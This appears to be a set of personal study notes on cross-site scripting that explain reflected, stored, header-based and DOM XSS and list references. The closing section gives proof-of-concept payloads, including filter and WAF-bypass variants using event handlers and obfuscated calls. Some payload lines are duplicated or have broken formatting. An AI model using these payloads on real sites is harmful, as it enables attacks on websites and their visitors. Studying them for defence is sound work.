# XSS - Cross Site Scripting



# XSS - Cross Site Scripting
### Cross-Site Scripting (XSS)
XSS is exploited when the attacker can successfully execute any type of script (for example, JavaScript) on the victim's browser. These types of flaws exist because the developer did not validate the request or correctly encoded the response of the application. JavaScript is not the only script language used for XSS but it is the most common (in fact it's my favorite); 

##### Types of XSS

- **Reflected XSS**
This flaw is exploited often when the page displays to the user something that
can be manipulated dynamically through a URLor in the body of the page.

- **Stored XSS**
The second type of attack is stored XSS. Exploiting this one will be accomplished by saving the script (JavaScript) into a stored location through a page (for example, Blogs, CMS, Forums) into some sort of a storage file (for example, database, file, and logs).
![[Pasted image 20220516161249.png]]

This flaw is dangerous because it is persisted and will execute when anyone visits the infected page later.
![[Pasted image 20220516160912.png]]

- **Exploiting stored XSS using the header**
Another interesting example that I would like to share with you is using the header to inject JavaScript into the page. Tricky right? But don't be surprised to see that the nature of web applications will allow us to manipulate the web page through the header.

- **DOM XSS**
In the first two types above, we've used the HTMLto exploit the XSS vulnerability. DOM XSS injection, however, is accomplished through the JavaScript code instead of the HTMLelements. 


- **What is a DOM (Document Object Model)?**
DOM is a W3C (World Wide Web Consortium) standard. It is a platform independent interface that allows programs and scripts to dynamically access and modify the structure of an document. The document can be HTML, XHTML or XML.
![[Pasted image 20220516163254.png]]
![[Pasted image 20220516163346.png]]
Let us apply the above definition practically:

Before modifying element using DOM: In the below figure, we have displayed an HTML element’s value using document.write function

![[Pasted image 20220516163425.png]]


- **JavaScript validation**
What if the page is protected by JavaScript validation, do you think we still can hack it? Of course we can; the JavaScript validation is not enough—we should do it on the server as well. 

![[Pasted image 20220516163515.png]]
![[Pasted image 20220516163539.png]]

==So, the partially patched code is:==
![[Pasted image 20220516163751.png]]
==So, the completely patched code is:==
![[Pasted image 20220516163904.png]]


### References:
- https://en.wikipedia.org/wiki/Document_Object_Model
- https://sucuri.net/guides/what-is-cross-site-scripting/
- https://www.acunetix.com/blog/articles/persistent-xss/
- https://medium.com/iocscan/persistent-cross-site-scripting-p-xss-557c70377554
- https://portswigger.net/web-security/cross-site-scripting/reflected
- https://www.acunetix.com/websitesecurity/detecting-blind-xss-vulnerabilities/


#### Simple payload
- `<script>alert(1)</script>`
#### Bypass WaF
- `<prompt(1)`
- `ScRiPt(1)
- `SCRIPt(1)`
#### Simple payload
- `<script>alert(1)</script>`
#### Bypass WaF
- `<prompt(1)`
- `ScRiPt(1)
- `SCRIPt(1)`
- ``<img/src/onerror=arguments[0].path.pop().alert(1)>  //to confuse the waf
- `<img src=x onerror=alert(1);>`
- ``<svg onload=alert(document.doamin) 
- ``<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
- `` <script type=module>import "xss"</script>
`<input type="text" value=`` <div/autofocus/onfo<!--esi-->cus='a<!--esi-->lert("XSS")’>X</div>` 
- ``<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
- ``<body onload='setInterval(f=_=>{for(t++,o=i=0,w=35;i<384;o+=i++%+w?(f+f+f)[i].fontcolor(g==9?"#FFF":[0,g,0]):"\n")g=0|(i/w-t/((i%w)**5%w+3)+w*t)%w;p.innerHTML=o},t=9)'bgcolor=X><pre id=p> 
- ``<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?("0o"[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||".").fontcolor(c>2):"\n");p.innerHTML=o},t=1)'>

